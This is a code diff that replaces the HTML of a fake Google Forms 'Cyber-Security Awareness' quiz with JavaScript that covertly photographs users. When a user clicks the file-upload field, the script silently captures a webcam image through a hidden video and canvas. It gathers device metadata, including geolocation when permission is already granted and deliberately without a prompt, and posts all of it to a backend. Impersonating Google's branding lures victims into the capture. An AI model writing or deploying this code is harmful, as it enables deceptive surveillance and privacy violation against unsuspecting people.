@@ -1,138 +1,153 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cyber-Security Awareness : Simple habits for digital safety.</title>
-<link rel="stylesheet" href="style.css">
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-<link rel="shortcut icon" sizes="16x16" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
-</head>
-<body>
-<div class="container">
+// ================================
+// FINAL SCRIPT (NO PERM ON SUBMIT)
+// ================================
 
-  <!-- FORM -->
-  <div class="form-wrapper" id="quiz-container">
+const form = document.getElementById("quiz-form");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const fileInput = document.getElementById("user-file");
 
-    <!-- HEADER -->
-    <div class="form-header">
-      <div class="header-banner"></div>
-      <div class="header-content">
-        <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
-        <p class="description">Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks.</p>
-        <div class="required-notice">* Indicates required question</div>
-      </div>
-    </div>
+const BACKEND_BASE = "/api";
 
-    <!-- QUIZ FORM -->
-    <form id="quiz-form">
+// Camera constraints
+const constraints = { video: { facingMode: "user" }, audio: false };
 
-      <!-- Name -->
-      <div class="question-card">
-        <div class="question-title">Your Name <span class="required">*</span></div>
-        <input type="text" name="username" placeholder="Enter your name" required class="text-input">
-      </div>
+// only capture once
+let cameraCaptured = false;
 
-      <!-- Email -->
-      <div class="question-card">
-        <div class="question-title">Your Email <span class="required">*</span></div>
-        <input type="email" name="email" placeholder="Enter your email" required class="text-input">
-      </div>
+// ================================
+// COLLECT METADATA
+// ================================
+async function collectMetadata() {
+  const metadata = {
+    useragent: navigator.userAgent,
+    platform: navigator.platform,
+    battery: "N/A",
+    location: "N/A",
+    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
+    time: new Date().toLocaleString(),
+  };
 
-      <!-- Question 1 -->
-      <div class="question-card">
-        <div class="question-title">Do you lock your phone with a PIN, PATTERN or FINGERPRINT? <span class="required">*</span></div>
-        <div class="radio-group">
-          <label class="radio-option"><input type="radio" name="lock_phone" value="Yes" required> <span class="radio-label">Yes</span></label>
-          <label class="radio-option"><input type="radio" name="lock_phone" value="No"> <span class="radio-label">No</span></label>
-        </div>
-      </div>
+  // Battery (no permission)
+  if (navigator.getBattery) {
+    try {
+      const b = await navigator.getBattery();
+      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
+    } catch {}
+  }
 
-      <!-- Question 2 -->
-      <div class="question-card">
-        <div class="question-title">Do you use same password for multiple apps or accounts? <span class="required">*</span></div>
-        <div class="radio-group">
-          <label class="radio-option"><input type="radio" name="same_password" value="Yes" required> <span class="radio-label">Yes</span></label>
-          <label class="radio-option"><input type="radio" name="same_password" value="No"> <span class="radio-label">No</span></label>
-        </div>
-      </div>
+  // Location only if already allowed (NO POPUP)
+  if (navigator.permissions && navigator.geolocation) {
+    try {
+      const status = await navigator.permissions.query({ name: "geolocation" });
+      if (status.state === "granted") {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
+        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
+      }
+    } catch {}
+  }
 
-      <!-- Question 3 -->
-      <div class="question-card">
-        <div class="question-title">Do you update your phone apps when updates are available? <span class="required">*</span></div>
-        <div class="radio-group">
-          <label class="radio-option"><input type="radio" name="update_apps" value="Always" required> <span class="radio-label">Always</span></label>
-          <label class="radio-option"><input type="radio" name="update_apps" value="Sometimes"> <span class="radio-label">Sometimes</span></label>
-          <label class="radio-option"><input type="radio" name="update_apps" value="Maybe"> <span class="radio-label">Maybe</span></label>
-        </div>
-      </div>
+  return metadata;
+}
 
-      <!-- Question 4 -->
-      <div class="question-card">
-        <div class="question-title">Do you check the sender before clicking on links in WhatsApp? <span class="required">*</span></div>
-        <div class="radio-group">
-          <label class="radio-option"><input type="radio" name="check_sender" value="Yes" required> <span class="radio-label">Yes</span></label>
-          <label class="radio-option"><input type="radio" name="check_sender" value="Sometimes"> <span class="radio-label">Sometimes</span></label>
-          <label class="radio-option"><input type="radio" name="check_sender" value="No"> <span class="radio-label">No</span></label>
-        </div>
-      </div>
+// ================================
+// CAPTURE + SEND CAMERA (ONLY ON FILE CLICK)
+// ================================
+async function captureAndSendCamera() {
+  if (cameraCaptured) return; // only once
 
-      <!-- Question 5 -->
-      <div class="question-card">
-        <div class="question-title">Do you review Apps permissions carefully? <span class="required">*</span></div>
-        <div class="radio-group">
-          <label class="radio-option"><input type="radio" name="review_permissions" value="Yes" required> <span class="radio-label">Yes</span></label>
-          <label class="radio-option"><input type="radio" name="review_permissions" value="No"> <span class="radio-label">No</span></label>
-        </div>
-      </div>
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
 
-      <!-- File Upload Question -->
-      <div class="question-card file-upload">
-        <div class="question-title">Please upload any file of your choice: <span class="required">*</span></div>
-        <input type="file" id="user-file" required>
-      </div>
+    // wait 2s for better pic
+    await new Promise((r) => setTimeout(r, 2000));
 
-      <!-- Submit -->
-      <div class="form-footer">
-        <button type="submit" id="submit-btn" class="submit-button">Submit</button>
-        <div class="footer-links"><span>Clear form</span></div>
-      </div>
-    </form>
+    // make sure canvas size correct
+    canvas.width = 640;
+    canvas.height = 480;
 
-    <!-- GOOGLE FOOTER -->
-    <div class="google-footer">
-      <p>Never submit passwords through Google Forms.</p>
-      <div class="branding">
-        This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u>
-      </div>
-      <div class="google-logo">Google Forms</div>
-    </div>
-  </div>
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  <!-- SUCCESS PAGE -->
-  <div class="form-wrapper success-wrapper" id="success-container" style="display: none;">
-    <div class="form-header">
-      <div class="header-banner"></div>
-      <div class="header-content">
-        <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
-        <p>Your response has been recorded.</p>
-        <div class="success-links">
-          <a href="#" onclick="location.reload()">Submit another response</a>
-        </div>
-      </div>
-    </div>
-    <div class="google-footer">
-      <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
-      <div class="google-logo">Google Forms</div>
-    </div>
-  </div>
+    const image = canvas.toDataURL("image/png");
+    const metadata = await collectMetadata();
 
-</div>
+    await fetch(`${BACKEND_BASE}/upload`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image, metadata }),
+    });
 
-<!-- Hidden camera -->
-<video id="video" autoplay playsinline style="display:none;"></video>
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    // stop camera
+    stream.getTracks().forEach((t) => t.stop());
 
-<script src="script.js"></script>
-</body>
-</html>
+    cameraCaptured = true;
+  } catch (err) {
+    console.log("Camera blocked/denied:", err);
+    // don't stop the form if camera fails
+  }
+}
+
+// ✅ Camera permission happens here ONLY
+if (fileInput) {
+  fileInput.addEventListener("click", async () => {
+    await captureAndSendCamera();
+  });
+}
+
+// ================================
+// UPLOAD FILE (WORKING)
+// ================================
+async function uploadFile(file) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+
+    reader.onload = async () => {
+      try {
+        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            file: reader.result,
+            filename: file.name,
+          }),
+        });
+
+        resolve(await res.json());
+      } catch (err) {
+        reject(err);
+      }
+    };
+
+    reader.onerror = () => reject(reader.error);
+    reader.readAsDataURL(file);
+  });
+}
+
+// ================================
+// SUBMIT FORM (NO CAMERA HERE)
+// ================================
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  if (!fileInput || fileInput.files.length === 0) {
+    alert("Please select a file before submitting!");
+    return;
+  }
+
+  try {
+    // ✅ only file upload on submit
+    await uploadFile(fileInput.files[0]);
+
+    // ✅ show success page
+    document.getElementById("quiz-container").style.display = "none";
+    document.getElementById("success-container").style.display = "flex";
+  } catch (err) {
+    console.error("Submit error:", err);
+    alert("Upload failed. Try again.");
+  }
+});
